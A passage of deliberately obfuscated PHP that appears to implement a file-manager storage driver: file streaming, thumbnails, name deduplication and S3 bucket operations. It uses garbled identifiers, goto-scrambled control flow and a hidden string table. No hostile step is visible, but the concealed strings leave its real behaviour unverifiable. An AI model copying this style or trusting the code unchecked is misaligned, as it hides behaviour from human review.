$Aì°«Ëƒ¦à - $DÇõ‚İùœô + 1; if ($DõêÅ³Ù¾ <= $d«³…ìß®) { $d«³…ìß® = $DõêÅ³Ù¾; } echo $this->fileSubstr($Dš„ñ Á§ƒ, $DÇõ‚İùœô, $d«³…ìß®); $DÇõ‚İùœô += $d«³…ìß®; if ($d«³…ìß® == $DõêÅ³Ù¾) { $DÇõ‚İùœô = $Aì°«Ëƒ¦à + 1; } if ($a„ÃÙÄí†™) { $e í¶¢ïĞæ = intval(1000 * 1000 * (timeFloat() - $EĞ¬‘Àå¸)); $C†‘ĞÚê®È = $a„ÃÙÄí†™ - $e í¶¢ïĞæ; if ($C†‘ĞÚê®È > 5) { usleep($C†‘ĞÚê®È); } } } goto ešĞè…äï; f¿äÏÆî¯Ë: header($bª•¢•ĞÆ˜[145] . $e…‡¿Ï¹‡Ü); header($bª•¢•ĞÆ˜[146]); if (!$AÏÕ¬Ãô¢š && $BµÆóŠæ == $bª•¢•ĞÆ˜[147]) { if ($e…‡¿Ï¹‡Ü > 1024 * 1024 * 5) { die; } $DÖËÀÈˆÁ‡ = $this->getContent($Dš„ñ Á§ƒ); $DÖËÀÈˆÁ‡ = Html::clearSVG($DÖËÀÈˆÁ‡); header($bª•¢•ĞÆ˜[148] . $e…‡¿Ï¹‡Ü); echo $DÖËÀÈˆÁ‡; die; } goto dñ—¸³Ñ‚Ğ; cÙ§½‹èâÓ: header($bª•¢•ĞÆ˜[142] . $D£ÓŸ³ÌÕŒ . $bª•¢•ĞÆ˜[134]); header($bª•¢•ĞÆ˜[143] . $BÇêİ§ÍĞ); header($bª•¢•ĞÆ˜[144]); goto f¿äÏÆî¯Ë; eÇ¶°¨ø½ó: header($bª•¢•ĞÆ˜[131]); header($bª•¢•ĞÆ˜[132] . $Bô‹“¾ÌÔç); header($bª•¢•ĞÆ˜[133] . gmdate($bª•¢•ĞÆ˜[116], time() + 3600 * 24 * 30) . $bª•¢•ĞÆ˜[134]); goto båòÊ©¸¬Ó; c‘§¤˜Šµ†: $fªºƒù¼Ì = !0; if ($_SERVER[$bª•¢•ĞÆ˜[161]] == $bª•¢•ĞÆ˜[162] && $e…‡¿Ï¹‡Ü > 1204 * 1024 * 1024 * 2) { $fªºƒù¼Ì = !1; } if ($fªºƒù¼Ì) { header($bª•¢•ĞÆ˜[163] . ($Aì°«Ëƒ¦à - $DÇõ‚İùœô + 1)); } goto e•†½î‚·; f›¤Œ±ùƒ: $DÇõ‚İùœô = 0; $Aì°«Ëƒ¦à = $e…‡¿Ï¹‡Ü - 1; $BµÆóŠæ = $this->ext($BÇêİ§ÍĞ); goto aö‰Ó‡óø; e•†½î‚·: if ($_SERVER[$bª•¢•ĞÆ˜[164]] == $bª•¢•ĞÆ˜[165]) { return; } $d«³…ìß® = 1024 * 100; $a„ÃÙÄí†™ = 0; goto f‡·ŒŞÚ“‘; aö‰Ó‡óø: if (in_array($BµÆóŠæ, array($bª•¢•ĞÆ˜[118], $bª•¢•ĞÆ˜[119], $bª•¢•ĞÆ˜[120], $bª•¢•ĞÆ˜[121]))) { $BµÆóŠæ = $bª•¢•ĞÆ˜[122]; } if (!$E’ÁÁìà…) { $E’ÁÁìà… = md5($D£ÓŸ³ÌÕŒ . $this->hashSimple($Dš„ñ Á§ƒ)); } $E’ÁÁìà… = $bª•¢•ĞÆ˜[123] . $E’ÁÁìà… . $bª•¢•ĞÆ˜[123]; goto A»¸†‚‡Ší; Dî´œ‘‡™‘: @ob_end_clean(); set_timeout(); $Bã·´µ…ø = $this->infoFull($Dš„ñ Á§ƒ); goto dˆÆ¢¿‹›; ešĞè…äï: } public function fileOutServer($F—àî¢¿™†, $Bïà¦â·í = false, $aœØ–Ö­Ê = false, $bßå÷¤· = '') { $this->fileOut($F—àî¢¿™†, $Bïà¦â·í, $aœØ–Ö­Ê, $bßå÷¤·); } public function fileOutLink($Bºî£·¦) { header($_SERVER[©][166] . $Bºî£·¦); die; } public function cacheMethod($bòğÂŒ–áÎ, $CõØ§Ó–Ì) { goto Fä­ÀˆÉ»Ô; cèÔö»®î: $Fİ·„İğï = $Aó„ø¨ÂĞÇ[167] . $bòğÂŒ–áÎ . $Aó„ø¨ÂĞÇ[168] . rtrim($AÄ™£¦ğØù, $Aó„ø¨ÂĞÇ[18]); if (is_null($bòğÂŒ–áÎ)) { $d´İ’ªŒ¿Š = array(); return; } if (is_null($CõØ§Ó–Ì)) { unset($d´İ’ªŒ¿Š[$Fİ·„İğï]); return; } goto bÀâ†Í¦ğ; C³¦¡Ûõ×: $d´İ’ªŒ¿Š[$Fİ·„İğï] = $d•ç¢Ë‰æ; return $d•ç¢Ë‰æ; goto bŒÇíŠÛÓ½; Fä­ÀˆÉ»Ô: $Aó„ø¨ÂĞÇ =& $_SERVER[©]; static $d´İ’ªŒ¿Š = array(); $AÄ™£¦ğØù = $CõØ§Ó–Ì ? ltrim($this->getPathOuter($CõØ§Ó–Ì), $Aó„ø¨ÂĞÇ[18]) : $CõØ§Ó–Ì; goto cèÔö»®î; bÀâ†Í¦ğ: $d•ç¢Ë‰æ = isset($d´İ’ªŒ¿Š[$Fİ·„İğï]) ? $d´İ’ªŒ¿Š[$Fİ·„İğï] : null; if (!is_null($d•ç¢Ë‰æ)) { return $d•ç¢Ë‰æ; } $d•ç¢Ë‰æ = $this->{$bòğÂŒ–áÎ}($CõØ§Ó–Ì); goto C³¦¡Ûõ×; bŒÇíŠÛÓ½: } public function fileOutImage($FÊÓã’ŠÅ, $e†³ÆõÚè = 250) { goto EÎ×ï¡¢²; eš¯ÎÆÌ·Á: if ($B«‚ÊêŸÔ[$f‡ğë÷Ç†[87]] <= 1024 * 50 || !function_exists($f‡ğë÷Ç†[169]) || $B«‚ÊêŸÔ[$f‡ğë÷Ç†[170]] == $f‡ğë÷Ç†[171]) { return $this->fileOut($FÊÓã’ŠÅ); } if (isset($B«‚ÊêŸÔ[$f‡ğë÷Ç†[172]][$f‡ğë÷Ç†[173]])) { $fÚø»°ãòŒ = $B«‚ÊêŸÔ[$f‡ğë÷Ç†[172]][$f‡ğë÷Ç†[173]]; } else { if (isset($B«‚ÊêŸÔ[$f‡ğë÷Ç†[172]][$f‡ğë÷Ç†[174]])) { $fÚø»°ãòŒ = $B«‚ÊêŸÔ[$f‡ğë÷Ç†[172]][$f‡ğë÷Ç†[174]]; } else { $fÚø»°ãòŒ = md5("{$B«‚ÊêŸÔ[$f‡ğë÷Ç†[38]]}\x5f{$B«‚ÊêŸÔ[$f‡ğë÷Ç†[85]]}\x5f{$B«‚ÊêŸÔ[$f‡ğë÷Ç†[87]]}"); } } $A³ºÂÌ¢âø = "{$fÚø»°ãòŒ}\x5f{$e†³ÆõÚè}\x2e\160\x6e\x67"; goto EªŠƒÂÛÔÏ; EªŠƒÂÛÔÏ: if (!($a¹ê¿‹ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $f‡ğë÷Ç†[175]))) { $BË•Õ¢íŸ† = IO::mkdir(IO_PATH_SYSTEM_TEMP . $f‡ğë÷Ç†[176]); } else { $BË•Õ¢íŸ† = KodIO::make($a¹ê¿‹); } if ($a¹ê¿‹ = IO::fileNameExist($BË•Õ¢íŸ†, $A³ºÂÌ¢âø)) { $BŠÙ÷§êÁ = KodIO::make($a¹ê¿‹); return IO::fileOut($BŠÙ÷§êÁ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto B‘ãœÑ‹â†; EÎ×ï¡¢²: $f‡ğë÷Ç† =& $_SERVER[©]; if (substr($FÊÓã’ŠÅ, 0, 4) == $f‡ğë÷Ç†[154]) { $this->fileOutLink($FÊÓã’ŠÅ); } $B«‚ÊêŸÔ = $this->info($FÊÓã’ŠÅ); goto eš¯ÎÆÌ·Á; B‘ãœÑ‹â†: $BŠÙ÷§êÁ = DATA_THUMB . $A³ºÂÌ¢âø; if (!@file_exists($BŠÙ÷§êÁ)) { $A½ŒË®İÉ® = TEMP_FILES; if (!is_dir($A½ŒË®İÉ®)) { mk_dir($A½ŒË®İÉ®); } $F«„„­Ô° = $A½ŒË®İÉ® . $fÚø»°ãòŒ . $f‡ğë÷Ç†[101] . $B«‚ÊêŸÔ[$f‡ğë÷Ç†[170]]; if (!@file_exists($F«„„­Ô°)) { $F«„„­Ô° = $this->download($FÊÓã’ŠÅ, $F«„„­Ô°); } $FÛÅÁï²ŒÄ = new ImageThumb($F«„„­Ô°, $f‡ğë÷Ç†[177]); $FÛÅÁï²ŒÄ->prorate($BŠÙ÷§êÁ, $e†³ÆõÚè, $e†³ÆõÚè * 10); } if (!file_exists($BŠÙ÷§êÁ) || filesize($BŠÙ÷§êÁ) < 100) { return @file_exists($F«„„­Ô°) ? IO::fileOut($F«„„­Ô°) : $this->fileOut($FÊÓã’ŠÅ); } goto fŒº´äÏÆÚ; fŒº´äÏÆÚ: if (!($Bë¬·†Ù±Ï = IO::move($BŠÙ÷§êÁ, $BË•Õ¢íŸ†))) { return IO::fileOut($BŠÙ÷§êÁ); } del_file($BŠÙ÷§êÁ); IO::fileOut($Bë¬·†Ù±Ï); goto A¡ù…‚ÔŠ; A¡ù…‚ÔŠ: } public function fileOutImageServer($E‡”£‚Ç¶, $eßô…ä÷ = 250) { $this->fileOutImage($E‡”£‚Ç¶, $eßô…ä÷); } public function fileNameAuto($BùóÈ–ëâ¼, $AÀÅåœÆæ‰, $dã×ÆÉĞ = REPEAT_RENAME, $a‰éº„Ì±Å = false) { goto eß‰ê„òˆò; aÅéà¬íøí: $a²¹‚³©àá = 1; $DÔºÇ»¤ = substr($AÀÅåœÆæ‰, 0, strlen($AÀÅåœÆæ‰) - strlen($b¦¯öâËó¹)); $EÏÄğ×ø¨Æ = $DÔºÇ»¤ . "\x28{$a²¹‚³©àá}\x29{$b¦¯öâËó¹}"; goto Ašä´é¢¸Î; eß‰ê„òˆò: $e—›ìÌ’« =& $_SERVER[©]; $A¸¶İÀ½¾ö = $BùóÈ–ëâ¼ === $e—›ìÌ’«[43] ? $AÀÅåœÆæ‰ : rtrim($BùóÈ–ëâ¼, $e—›ìÌ’«[18]) . $e—›ìÌ’«[18] . $AÀÅåœÆæ‰; if ($dã×ÆÉĞ == REPEAT_REPLACE || !$this->exist($A¸¶İÀ½¾ö) || $a‰éº„Ì±Å && $dã×ÆÉĞ != REPEAT_RENAME_FOLDER) { return $AÀÅåœÆæ‰; } goto fÙ…ˆÇ©·; fÙ…ˆÇ©·: if ($dã×ÆÉĞ == REPEAT_SKIP) { return !1; } $b¦¯öâËó¹ = $e—›ìÌ’«[101] . get_path_ext($AÀÅåœÆæ‰); $b¦¯öâËó¹ = $b¦¯öâËó¹ == $e—›ìÌ’«[101] || $a‰éº„Ì±Å ? $e—›ìÌ’«[43] : $b¦¯öâËó¹; goto aÅéà¬íøí; Ašä´é¢¸Î: while ($this->exist(rtrim($BùóÈ–ëâ¼, $e—›ìÌ’«[18]) . $e—›ìÌ’«[18] . $EÏÄğ×ø¨Æ)) { $EÏÄğ×ø¨Æ = $DÔºÇ»¤ . "\x28{$a²¹‚³©àá}\51{$b¦¯öâËó¹}"; $a²¹‚³©àá++; } return $EÏÄğ×ø¨Æ; goto cï—Ú–…÷İ; cï—Ú–…÷İ: } public function listAllFiles($cëŸÛíõÖË, $Aê¥®„æØë, $eÁ”À©Š = array()) { goto bÍ¦îŞ¢Î¼; aĞÆõĞİÑ: foreach (array_unique($döÙ‹‡Ì£) as $c‹ˆ»©„¸ß) { $Dºä±—ªÃ¼ = array($d÷ŒÇ§ê¢…[85] => $this->getPathOuter($d÷ŒÇ§ê¢…[18] . $cëŸÛíõÖË . $d÷ŒÇ§ê¢…[18] . $c‹ˆ»©„¸ß), $d÷ŒÇ§ê¢…[86] => 1, $d÷ŒÇ§ê¢…[87] => 0); if (substr($c‹ˆ»©„¸ß, -1) != $d÷ŒÇ§ê¢…[18]) { $Dºä±—ªÃ¼[$d÷ŒÇ§ê¢…[86]] = 0; $C¦†‰¤„½ = $this->getPath($cëŸÛíõÖË . $d÷ŒÇ§ê¢…[18] . $c‹ˆ»©„¸ß); $Dºä±—ªÃ¼[$d÷ŒÇ§ê¢…[87]] = isset($eÁ”À©Š[$C¦†‰¤„½]) ? $eÁ”À©Š[$C¦†‰¤„½] : $this->size($C¦†‰¤„½); } $A¶¹¡¯”ò[] = $Dºä±—ªÃ¼; } return $A¶¹¡¯”ò; goto Cè¢ÔßÍ’; bÍ¦îŞ¢Î¼: $d÷ŒÇ§ê¢… =& $_SERVER[©]; if (empty($Aê¥®„æØë)) { return array(); } $döÙ‹‡Ì£ = array(); goto a‚«ÙÚŞÖÑ; a‚«ÙÚŞÖÑ: $cëŸÛíõÖË = trim($cëŸÛíõÖË, $d÷ŒÇ§ê¢…[18]); foreach ($Aê¥®„æØë as $c‹ˆ»©„¸ß) { $f‹Ğ”ĞÍ†À = ltrim(substr($c‹ˆ»©„¸ß, strlen($cëŸÛíõÖË)), $d÷ŒÇ§ê¢…[18]); $döÙ‹‡Ì£ = array_merge($döÙ‹‡Ì£, $this->slicePath($f‹Ğ”ĞÍ†À)); } $A¶¹¡¯”ò = array(); goto aĞÆõĞİÑ; Cè¢ÔßÍ’: } public function slicePath($C„÷ÕÊß¸) { $D¶Ğ²ØØİõ =& $_SERVER[©]; $dæ–‹ìğŸ½ = explode($D¶Ğ²ØØİõ[18], trim($C„÷ÕÊß¸, $D¶Ğ²ØØİõ[18])); $B¡È‹ŠÅ‹Ø = 0; do { ++$B¡È‹ŠÅ‹Ø; $eÖ‡÷º–·[] = implode($D¶Ğ²ØØİõ[18], array_slice($dæ–‹ìğŸ½, 0, $B¡È‹ŠÅ‹Ø)) . $D¶Ğ²ØØİõ[18]; } while ($B¡È‹ŠÅ‹Ø < count($dæ–‹ìğŸ½)); $eÖ‡÷º–·[count($dæ–‹ìğŸ½) - 1] = $C„÷ÕÊß¸; return $eÖ‡÷º–·; } public function getHost() { $f‚œÆ”¿øÓ =& $_SERVER[©]; $b°ô¥ÂØ¯Ü = parse_url(trim($this->domain, $f‚œÆ”¿øÓ[18])); $E¨Åó‰õ÷ = isset($b°ô¥ÂØ¯Ü[$f‚œÆ”¿øÓ[178]]) ? $b°ô¥ÂØ¯Ü[$f‚œÆ”¿øÓ[178]] : http_type(); $dÓ°Íš›¦Õ = isset($b°ô¥ÂØ¯Ü[$f‚œÆ”¿øÓ[179]]) ? $b°ô¥ÂØ¯Ü[$f‚œÆ”¿øÓ[179]] : $b°ô¥ÂØ¯Ü[$f‚œÆ”¿øÓ[85]]; if (isset($b°ô¥ÂØ¯Ü[$f‚œÆ”¿øÓ[180]])) { $dÓ°Íš›¦Õ .= $f‚œÆ”¿øÓ[14] . $b°ô¥ÂØ¯Ü[$f‚œÆ”¿øÓ[180]]; } return $E¨Åó‰õ÷ . $f‚œÆ”¿øÓ[181] . $dÓ°Íš›¦Õ; } public function pathEncode($D‰ì³¯Ò¾à) { $DñÖŞÜñ½¼ =& $_SERVER[©]; return str_replace($DñÖŞÜñ½¼[182], $DñÖŞÜñ½¼[18], rawurlencode($D‰ì³¯Ò¾à)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($cÛ„Üƒ«) { set_timeout(); require_once SDK_DIR . $_SERVER[©][183]; parent::__construct(); $this->_init($cÛ„Üƒ«); } public function _init($Aì¡¿½¹) { foreach ($Aì¡¿½¹ as $bÇÎº‰ëÅ¬ => $B¦«Ğ­¬´Û) { if (isset($this->{$bÇÎº‰ëÅ¬})) { $this->{$bÇÎº‰ëÅ¬} = $B¦«Ğ­¬´Û; } } $this->endpoint = $Aì¡¿½¹[$_SERVER[©][184]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($f¥ÖÎš®÷» = "\166\x34") { $this->signVer = $f¥ÖÎš®÷»; $this->client->setSignatureVersion($f¥ÖÎš®÷»); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto fìŞ¯ã–àñ; CµÙ‘µÀº: $CèÑ¯ì¥¯– = array($EÑ¬á¼¨«÷[190], $EÑ¬á¼¨«÷[191], $EÑ¬á¼¨«÷[192], $EÑ¬á¼¨«÷[193], $EÑ¬á¼¨«÷[194]); $Aºî¡’Ø’ = array_diff($CèÑ¯ì¥¯–, $Fî‰ÂÁá—Ñ); return empty($Aºî¡’Ø’); goto fÏ¤¨À–Í; fìŞ¯ã–àñ: $EÑ¬á¼¨«÷ =& $_SERVER[©]; $Dµ¦°ÊªŠ¥ = $this->getBucketCors(); if (!$Dµ¦°ÊªŠ¥ || !is_array($Dµ¦°ÊªŠ¥)) { return !1; } goto c ÃÇæ­…ƒ; c ÃÇæ­…ƒ: if ($Dµ¦°ÊªŠ¥[$EÑ¬á¼¨«÷[185]] != $EÑ¬á¼¨«÷[186] || $Dµ¦°ÊªŠ¥[$EÑ¬á¼¨«÷[187]] != $EÑ¬á¼¨«÷[186]) { return !1; } $Fî‰ÂÁá—Ñ = array_map($EÑ¬á¼¨«÷[188], $Dµ¦°ÊªŠ¥[$EÑ¬á¼¨«÷[189]]); if (!is_array($Fî‰ÂÁá—Ñ)) { $Fî‰ÂÁá—Ñ = array(); } goto CµÙ‘µÀº; fÏ¤¨À–Í: } public function mkfile($Bà°§³ÇÛ, $B³¶Ç‚¸Ëƒ = '', $EèÑ‚ä½ä = REPEAT_RENAME) { $dº¬†š‘ñ = $this->setContent($Bà°§³ÇÛ, $B³¶Ç‚¸Ëƒ); if ($dº¬†š‘ñ !== !1) { return $this->getPathOuter($Bà°§³ÇÛ); } return !1; } public function mkdir($C”ğ¦Ë»š, $BÁ§¦…Ø„ = REPEAT_SKIP) { if (empty($C”ğ¦Ë»š)) { return !1; } if ($this->_isFolder($C”ğ¦Ë»š)) { return $this->getPathOuter($C”ğ¦Ë»š); } $c»å·íµ¹³ = $this->setContent($C”ğ¦Ë»š, $_SERVER[©][43], !0); if ($c»å·íµ¹³ !== !1) { return $this->getPathOuter($C”ğ¦Ë»š); } return !1; } public function copyFile($aÅ®ù’×³Ğ, $bí£Ñ¢šÉ, $a«³Ä…ùñ§ = array()) { $cèŒÚ›ˆ‡‚ =& $_SERVER[©]; $eì “æ­ßá = $this->objectMeta($aÅ®ù’×³Ğ); if (!$eì “æ­ßá) { return !1; } if ($eì “æ­ßá[$cèŒÚ›ˆ‡‚[87]] <= 1024 * 1024 * 200) { $aìÇŒ×ç›¢ = $this->client->copyObject($this->bucket, $aÅ®ù’×³Ğ, $this->bucket, $bí£Ñ¢šÉ, $cèŒÚ›ˆ‡‚[195], $a«³Ä…ùñ§); } else { $aìÇŒ×ç›¢ = $this->client->multiCopyObject($this->bucket, $aÅ®ù’×³Ğ, $this->bucket, $bí£Ñ¢šÉ, $a«³Ä…ùñ§); } $aìÇŒ×ç›¢ = $aìÇŒ×ç›¢ ? $this->getPathOuter($bí£Ñ¢šÉ) : !1; return $aìÇŒ×ç›¢; } public function moveFile($f‹‹ ÖåÍÍ, $D–”ò¿ï·) { if ($this->copyFile($f‹‹ ÖåÍÍ, $D–”ò¿ï·)) { $this->delFile($f‹‹ ÖåÍÍ); return $this->getPathOuter($D–”ò¿ï·); } return !1; } public function delFile($aÑ¨ì™…˜‘) { return $this->client->deleteObject($this->bucket, $aÑ¨ì™…˜‘); } public function delFolder($FªàÌëÁë) { goto eò»íáç¥‡; EÕ×„†âÂ: return $fé¿Ş‡÷½É === $EáË¸İ”¶Ì ? !0 : !1; goto CÆ¡¶¼Î˜; eò»íáç¥‡: $cÁ‡‡âğóù =& $_SERVER[©]; $fğÛ³È»½ğ = $this->listObjs($FªàÌëÁë); if (!$fğÛ³È»½ğ) { $FªàÌëÁë = trim($FªàÌëÁë, $cÁ‡‡âğóù[18]); if (!empty($FªàÌëÁë)) { $FªàÌëÁë .= $cÁ‡‡âğóù[18]; } return $this->delFile($FªàÌëÁë); } goto CÕšİïÑÉ—; CÕšİïÑÉ—: $fé¿Ş‡÷½É = $EáË¸İ”¶Ì = 0; $b´Üğá²¯‘ = array_chunk(array_keys($fğÛ³È»½ğ), 1000); foreach ($b´Üğá²¯‘ as $d’èæ«×°) { $fé¿Ş‡÷½É++; $EáË¸İ”¶Ì += (int) $this->client->deleteObjects($this->bucket, $d’èæ«×°); } goto EÕ×„†âÂ; CÆ¡¶¼Î˜: } public function rename($e¬ÒŠ›æé, $Cª—ÊŞÎ‰Â) { return $this->renameObject($e¬ÒŠ›æé, $Cª—ÊŞÎ‰Â); } public function listPath($F‡æ„Ùã, $D ÀÊ‹ÀÙ¡ = false) { $a»¬Šù¶Ÿ— =& $_SERVER[©]; $CÜ„…ÅÇã‚ = $this->listObjs($F‡æ„Ùã, null, null, $a»¬Šù¶Ÿ—[18]); $fØ§ë‘¹´ = array($a»¬Šù¶Ÿ—[84] => array(), $a»¬Šù¶Ÿ—[83] => array()); foreach ($CÜ„…ÅÇã‚ as $eÚ³´×¸‡ï => $B¢Ï¶ª²á) { if ($eÚ³´×¸‡ï == $a»¬Šù¶Ÿ—[18]) { continue; } if (isset($B¢Ï¶ª²á[$a»¬Šù¶Ÿ—[196]])) { $fØ§ë‘¹´[$a»¬Šù¶Ÿ—[84]][] = $this->folderInfo($B¢Ï¶ª²á[$a»¬Šù¶Ÿ—[196]], $D ÀÊ‹ÀÙ¡); } else { if (substr($B¢Ï¶ª²á[$a»¬Šù¶Ÿ—[38]], -1) == $a»¬Šù¶Ÿ—[18]) { continue; } $fØ§ë‘¹´[$a»¬Šù¶Ÿ—[83]][] = $this->fileInfo($B¢Ï¶ª²á[$a»¬Šù¶Ÿ—[38]], $D ÀÊ‹ÀÙ¡, $B¢Ï¶ª²á); } } return $fØ§ë‘¹´; } private function fileInfo($D¾“³é°®, $c–˜›Ó×Úˆ = false, $D¤‘ŒÊÑ·æ = array()) { goto bÎ¿¨ŞõÅ¨; bÎ¿¨ŞõÅ¨: $f¶“³ùæ¯á =& $_SERVER[©]; if ($c–˜›Ó×Úˆ) { return array($f¶“³ùæ¯á[38] => $this->pathThis($D¾“³é°®), $f¶“³ùæ¯á[85] => $this->getPathOuter($D¾“³é°®), $f¶“³ùæ¯á[39] => $f¶“³ùæ¯á[177], $f¶“³ùæ¯á[170] => $this->ext($D¾“³é°®), $f¶“³ùæ¯á[87] => isset($D¤‘ŒÊÑ·æ[$f¶“³ùæ¯á[87]]) ? $D¤‘ŒÊÑ·æ[$f¶“³ùæ¯á[87]] : 0, $f¶“³ùæ¯á[197] => 0, $f¶“³ùæ¯á[117] => 0, $f¶“³ùæ¯á[198] => !0, $f¶“³ùæ¯á[199] => !0); } $eï×ª±½Åœ = array($f¶“³ùæ¯á[38] => $this->pathThis($D¾“³é°®), $f¶“³ùæ¯á[85] => $this->getPathOuter($D¾“³é°®), $f¶“³ùæ¯á[39] => $f¶“³ùæ¯á[177], $f¶“³ùæ¯á[197] => 0, $f¶“³ùæ¯á[117] => 0, $f¶“³ùæ¯á[87] => 0, $f¶“³ùæ¯á[170] => $this->ext($D¾“³é°®), $f¶“³ùæ¯á[198] => !0, $f¶“³ùæ¯á[199] => !0); goto b×¤¿‰Ğß; EÑ¨ğØ•: return $eï×ª±½Åœ; goto a£…¨¬®¼÷; b×¤¿‰Ğß: if (empty($D¤‘ŒÊÑ·æ)) { $D¤‘ŒÊÑ·æ = $this->objectMeta($D¾“³é°®); if (!$D¤‘ŒÊÑ·æ) { return $eï×ª±½Åœ; } } if (isset($D¤‘ŒÊÑ·æ[$f¶“³ùæ¯á[200]])) { $eï×ª±½Åœ[$f¶“³ùæ¯á[117]] = $D¤‘ŒÊÑ·æ[$f¶“³ùæ¯á[200]]; } if (isset($D¤‘ŒÊÑ·æ[$f¶“³ùæ¯á[87]])) { $eï×ª±½Åœ[$f¶“³ùæ¯á[87]] = $D¤‘ŒÊÑ·æ[$f¶“³ùæ¯á[87]]; } goto EÑ¨ğØ•; a£…¨¬®¼÷: } private function folderInfo($D„µ‚âÎ–â, $aõŠ•Ãšê¸ = false) { goto d³ŞØ–´¹; d³ŞØ–´¹: $Eâº…„ì¸ =& $_SERVER[©]; if ($aõŠ•Ãšê¸) { return array($Eâº…„ì¸[38] => $this->pathThis($D„µ‚âÎ–â), $Eâº…„ì¸[85] => $this->getPathOuter($Eâº…„ì¸[18] . $D„µ‚âÎ–â), $Eâº…„ì¸[39] => $Eâº…„ì¸[86], $Eâº…„ì¸[198] => !0, $Eâº…„ì¸[199] => !0); } $D­íÕÀîó¥ = array($Eâº…„ì¸[38] => $this->pathThis($D„µ‚âÎ–â), $Eâº…„ì¸[85] => $this->getPathOuter($Eâº…„ì¸[18] . $D„µ‚âÎ–â), $Eâº…„ì¸[39] => $Eâº…„ì¸[86], $Eâº…„ì¸[197] => 0, $Eâº…„ì¸[117] => 0, $Eâº…„ì¸[198] => !0, $Eâº…„ì¸[199] => !0); goto CÉó›ÎªëÜ; CÉó›ÎªëÜ: if ($D„µ‚âÎ–â == $Eâº…„ì¸[43]) { return $D­íÕÀîó¥; } $D„µ‚âÎ–â = trim($D„µ‚âÎ–â, $Eâº…„ì¸[18]) . $Eâº…„ì¸[18]; $D¿ÕğËè©• = $this->objectMeta($D„µ‚âÎ–â); goto F¬–ñŸñà–; F¬–ñŸñà–: if (isset($D¿ÕğËè©•[$Eâº…„ì¸[200]])) { $D­íÕÀîó¥[$Eâº…„ì¸[197]] = $D¿ÕğËè©•[$Eâº…„ì¸[200]]; } return $D­íÕÀîó¥; goto Dâš·½éÏƒ; Dâš·½éÏƒ: } public function listObjs($fâëÛÔó‡, $C§’§Äã´ô = null, $FÑÊÃ®Øå« = null, $c¯è¨Ñ‘¡ç = null) { $c¸Œóİ¨£¬ =& $_SERVER[©]; $fâëÛÔó‡ = trim($fâëÛÔó‡, $c¸Œóİ¨£¬[18]); $E¿¢…À¬£¯ = empty($fâëÛÔó‡) ? $c¸Œóİ¨£¬[43] : $fâëÛÔó‡ . $c¸Œóİ¨£¬[18]; return $this->client->getBucket($this->bucket, $E¿¢…À¬£¯, $C§’§Äã´ô, $FÑÊÃ®Øå«, $c¯è¨Ñ‘¡ç, !0); } public function has($C«¬İÈ™•…, $e‚—®ë‘Şò = false, $f†èÇ ñ®Ü = true) { goto F“†¡ì‘´Ø; CÖÉĞ­«Ş: $d»˜²¨÷ñ = $this->listObjs($C«¬İÈ™•…, null, null, $bİÀŒå³ì•[18]); $d»˜²¨÷ñ = is_array($d»˜²¨÷ñ) ? $d»˜²¨÷ñ : array(); foreach ($d»˜²¨÷ñ as $eøî„ğŞšƒ) { if (isset($eøî„ğŞšƒ[$bİÀŒå³ì•[38]]) && substr($eøî„ğŞšƒ[$bİÀŒå³ì•[38]], -1) != $bİÀŒå³ì•[18]) { if (!$e‚—®ë‘Şò && $f†èÇ ñ®Ü) { return !0; } $e°¡á˜ˆ++; } else { if (isset($eøî„ğŞšƒ[$bİÀŒå³ì•[196]])) { if (!$e‚—®ë‘Şò && !$f†èÇ ñ®Ü) { return !1; } $Dí÷âß‚++; } } } goto aï¨õ¹£Šæ; aï¨õ¹£Šæ: if ($e‚—®ë‘Şò) { return array($bİÀŒå³ì•[201] => $e°¡á˜ˆ, $bİÀŒå³ì•[202] => $Dí÷âß‚); } return !1; goto CÙ¶¸¤¦µø; F“†¡ì‘´Ø: $bİÀŒå³ì• =& $_SERVER[©]; $e°¡á˜ˆ = 0; $Dí÷âß‚ = 0; goto CÖÉĞ­«Ş; CÙ¶¸¤¦µø: } public function listAll($DÊ³“ÚğÑ²) { $Bµ…®é£§Ò =& $_SERVER[©]; $fÕÈ²¢—£¥ = $this->listObjs($DÊ³“ÚğÑ²); $e’Ñ‘íÛ = $B©„‘ÕÈà‡ = array(); foreach ($fÕÈ²¢—£¥ as $Bİºõ½­—¨ => $ağéÄ¦ÒÔù) { $e’Ñ‘íÛ[] = $ağéÄ¦ÒÔù[$Bµ…®é£§Ò[38]]; $B©„‘ÕÈà‡[$Bİºõ½­—¨] = $ağéÄ¦ÒÔù[$Bµ…®é£§Ò[87]]; } return $this->listAllFiles($DÊ³“ÚğÑ², $e’Ñ‘íÛ, $B©„‘ÕÈà‡); } public function canRead($aŞàŒ™İğ) { $fÌ²ñØˆƒ„ =& $_SERVER[©]; $bß‰†Íİ = $this->client->getAccessControlPolicy($this->bucket, $aŞàŒ™İğ); if (!$bß‰†Íİ) { return !1; } return in_array($bß‰†Íİ, array($fÌ²ñØˆƒ„[203], $fÌ²ñØˆƒ„[204], $fÌ²ñØˆƒ„[205])) ? !0 : !1; } public function canWrite($cËŞÃ¶ÌŞ¿) { $Fº¡ÜÅ‰ÇÊ =& $_SERVER[©]; $E‘ß‡‘‡ğ = $this->client->getAccessControlPolicy($this->bucket, $cËŞÃ¶ÌŞ¿); if (!$E‘ß‡‘‡ğ) { return !1; } return in_array($E‘ß‡‘‡ğ, array($Fº¡ÜÅ‰ÇÊ[203], $Fº¡ÜÅ‰ÇÊ[204])) ? !0 : !1; } public function getContent($d„ÏÏóèïâ) { return $this->client->getObject($this->bucket, $d„ÏÏóèïâ); } public function setContent($eÄ‘ñÛÖÊ, $b³ŠÍ„˜ = '', $Aê¬Ç§íŒ = false) { goto e™‰„ÑÔ®; e™‰„ÑÔ®: $dšßÚâà¼à =& $_SERVER[©]; $eÄ‘ñÛÖÊ = $Aê¬Ç§íŒ ? trim($eÄ‘ñÛÖÊ, $dšßÚâà¼à[18]) . 